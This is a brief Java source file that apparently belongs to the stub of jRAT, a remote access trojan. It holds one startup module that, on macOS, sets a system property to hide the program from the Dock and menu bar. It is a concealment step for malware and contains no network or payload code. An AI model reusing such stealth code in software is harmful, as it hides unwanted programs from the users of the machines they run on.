package io.jrat.stub.modules.startup;

import io.jrat.common.OperatingSystem;

import java.util.Map;

public class OSXToolBarStartupModule extends StartupModule {
	
	public OSXToolBarStartupModule(Map<String, String> config) {
		super(config);
	}
	
	public void run() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			System.setProperty("apple.awt.UIElement", "true");
		}
	}

}
